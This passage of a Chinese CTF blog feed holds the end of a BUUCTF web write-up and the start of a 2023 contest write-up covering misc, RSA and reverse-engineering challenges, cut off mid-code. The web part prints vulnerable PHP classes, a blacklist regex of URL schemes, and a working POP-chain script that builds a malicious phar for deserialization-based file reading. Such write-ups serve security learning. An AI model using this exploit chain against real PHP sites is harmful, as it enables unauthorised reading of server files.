    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token comment">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>"; </span>
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span> 
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在<code>_show()</code>类中如果要进行文件读取获得flag文件可是文件名会被过滤，另找方法。<br>在Test类中存在<code>_get()</code>函数：当调用一个不存在的方法的时候触发<code>_get</code>，<code>__get</code>又会触发get函数，get又会触发<code>file_get</code>函数来读取文件，而<code>file_get</code>函数将文件内容进行base64加密。<br>那么就需要找一个不存在的方法来触发<code>__get</code>。在<code>Show</code>类中的<code>__tostring()</code>方法让<code>str[&#39;str&#39;]</code>变成<code>Test</code>类，然后再调用source就会触发。这里找到<code>__toString</code>的触发点，在把一个类当成字符串的时候才会触发，可以利用<code>C1e4r</code>类</p>
<p>总体思路：</p>
<blockquote>
<p>通过<code>C1e4r</code>，将<code>str</code>赋值为<code>Show</code>类，触发<code>__tostring</code>方法，将<code>str[&#39;str&#39;]</code>赋值为<code>Test</code>类调用<code>source</code>触发<code>Test</code>的<code>__get()</code>方法–&gt;<code>get</code>–&gt;<code>file_get</code>-&gt;<code>flag</code></p>
</blockquote>
<p>pop链子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">//Test类中没有source属性，可以根据这个调用__get()函数</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token comment">//数组类型的数值</span>
<span class="token punctuation">&#125;</span>


<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//链子以$a为起点</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将生成的phar文件改为png文件后缀然后上传<br><img src="https://img-blog.csdnimg.cn/direct/98a7438692fc4e4e80047777d1b117cf.png" alt="456"><br>然后访问upload文件夹<br><img src="https://img-blog.csdnimg.cn/direct/2949540fb11e4deb8a55e9fb6f71a348.png" alt="123"><br>使用phar协议读取文件<br><code>http://38b4a3d2-8682-421d-91a5-7adf667005a3.node4.buuoj.cn:81/file.php?file=phar://upload/a8814e077fc8a92d25a18efa7c4d87ec.jpg</code><br><img src="https://img-blog.csdnimg.cn/direct/d0894769fb9340acbfb61b581e2af7d6.png" alt="789"><br>将得到的源码进行base64解密拿到flag</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023金盾信安杯初赛wp</title>
    <url>/2023/11/27/2023%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第二次参加金盾信安杯了，记得去年参加是在寒假，由于“口罩原因”学校放假早，在进行完第二次考核之后就回家了，当时也没有学到什么。回到家由于知道自己要参加第一次省级赛事，不敢划水了。。。<br>第一次参加的时候应该也是8个小时（具体记不清了），我知道，我是真的做不出来题目，但是最后还是混了一个三等奖。<br>今年再次参加，本以为会有一个不错的成绩，可是从比赛名次上也看出来了自己还有很多不足，不算很高但也不是很低（混了一个一等），总感觉自己在很多方面还很欠缺，继续努力吧！！！！<br><img src="http://img-blog.csdnimg.cn/9810cd7ef58a439d83955da8bbfee715.png" alt="123"></p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Hakiehs"><a href="#Hakiehs" class="headerlink" title="Hakiehs"></a>Hakiehs</h4><p>将attachment.vsdx文件后缀改为zip文件然后解压，在文件里找到这个图片<br><img src="http://img-blog.csdnimg.cn/b36eda2e38044c96a48e93abe63eda66.png" alt="132"><br>从上到下分别为botw、GERUDO、樊凡语<br><img src="http://img-blog.csdnimg.cn/d8573ea45667465daf701c0bc0fef025.png" alt="456"><br><img src="http://img-blog.csdnimg.cn/f9e6f7ccb8364b968ba4b47b60bc55aa.png" alt="789"><br><img src="http://img-blog.csdnimg.cn/953ac6ba3cdb4453b4e1b2bbe784ba41.png" alt="789"><br>分别找出对应的字母<br>linkzeldaganon</p>
<h4 id="来都来了"><a href="#来都来了" class="headerlink" title="来都来了"></a>来都来了</h4><p><img src="http://img-blog.csdnimg.cn/ef40a915046f4e6c86bc91ca8d551122.png" alt="456"></p>
<p>附件打开直接弹出密码，拖进winhex里看是伪加密，将标志位改成00 00<br><img src="http://img-blog.csdnimg.cn/96011ab1639a469baf75a71dc8dfc076.png" alt="789"><br>另存为一个文件，打开得到一段txt文本文件<br><img src="http://img-blog.csdnimg.cn/35b002e18f4d4fc2b4137c7700f1d4a9.png" alt="789"><br>怀疑是base64进行解密后发现好像是一段字符串<br><img src="http://img-blog.csdnimg.cn/0e11ccaf0efc49ba871ad0eb61ab7c33.png" alt="123"><br>复制下来后拖进记事本缩小字体得到flag<br><img src="http://img-blog.csdnimg.cn/4dfefa8465334102949f8ab0e9ca822d.png" alt="789"><br>flag{cp2ae315-eef4-3fra-a768-cd9xb19cdk4e}</p>
<h4 id="芙宁娜"><a href="#芙宁娜" class="headerlink" title="芙宁娜"></a>芙宁娜</h4><p>打开图片进行将其中图片中的base64编码进行解码<br><img src="http://img-blog.csdnimg.cn/585800fcd81a469d9c778da2a9e57855.png" alt="798"><br>由于这个flag的格式是uuid</p>
<blockquote>
<p>标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)</p>
</blockquote>
<p>也就是说此时尾部还差4个字符，此时我们还没有想到爆破flag，就是先找到另外的解法，但是当时一位队员尝试爆破后4位字符（制作字典，抓包爆破，真的是可行的），最终得到了正确答案8e8f（由于比赛已经结束，现在无法根据返回包判断）<br><img src="http://img-blog.csdnimg.cn/772acfeb19ac44b891619d64039af44f.png" alt="456"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="我看看谁还不会RSA"><a href="#我看看谁还不会RSA" class="headerlink" title="我看看谁还不会RSA"></a>我看看谁还不会RSA</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> secret

m <span class="token operator">=</span> secret<span class="token punctuation">.</span>flag
p<span class="token operator">=</span><span class="token number">8666789885346075954502743436174521501697</span>
q<span class="token operator">=</span><span class="token number">2449101960789395782044494299423558347143</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">37777</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
<span class="token comment"># c = 8232151627233115772131180151146951323147507324390914513031444555762539986162650</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>写如下脚本运行得到d、m的数值，得到的d值再赋值给e重新运行得到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp
<span class="token keyword">import</span> binascii

p<span class="token operator">=</span><span class="token number">8666789885346075954502743436174521501697</span>
q<span class="token operator">=</span><span class="token number">2449101960789395782044494299423558347143</span>
e<span class="token operator">=</span><span class="token number">37777</span>
c<span class="token operator">=</span><span class="token number">8232151627233115772131180151146951323147507324390914513031444555762539986162650</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="http://img-blog.csdnimg.cn/288c7d52921046af860a8d8f571e84e3.png" alt="456"><br><img src="http://img-blog.csdnimg.cn/d969fd08383c44edac8ad4eae731fc26.png" alt="789"><br>flag{r5a_Who_w0nt}</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h4><p><img src="http://img-blog.csdnimg.cn/093d81a015d24558aad13b7f06d521c5.png" alt="789"><br>发现是64位，于是拖到64位ida里面<br>找到main函数进行F5反编译得到如下代码<br><img src="http://img-blog.csdnimg.cn/c4c2c01e1cba4c8f8526f3546eae7ab4.png" alt="789"><br>跟进关键函数sub_401AD0(v6);接着跟进sub_401850(Block);<br><img src="http://img-blog.csdnimg.cn/35c5af22280e443aa219c8d4ace47f16.png" alt="789"><br>V9为密文，上面的&amp;unk_473040,中有一些奇怪的数据，按C转汇编代码后<br><img src="http://img-blog.csdnimg.cn/a6e6b03bcdde412d9bad06f146e75874.png" alt="789"><br>选中汇编代码P创建函数F5反编译<br><img src="http://img-blog.csdnimg.cn/70064fc4a12a4550aa9cb655d43766d3.png" alt="789"><br>分析发现是类RC4解密算法，将题目给的密文用这段代码解密得到flag。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>

    <span class="token keyword">void</span>  <span class="token function">aaa</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> k<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> v3<span class="token punctuation">[</span><span class="token number">515</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v4<span class="token punctuation">;</span>
    <span class="token keyword">char</span> v5<span class="token punctuation">;</span>
    <span class="token keyword">int</span> j<span class="token punctuation">;</span>
    <span class="token keyword">int</span> v7<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    v7 <span class="token operator">=</span> <span class="token punctuation">(</span>v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">+</span> v7 <span class="token operator">+</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>
    v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>
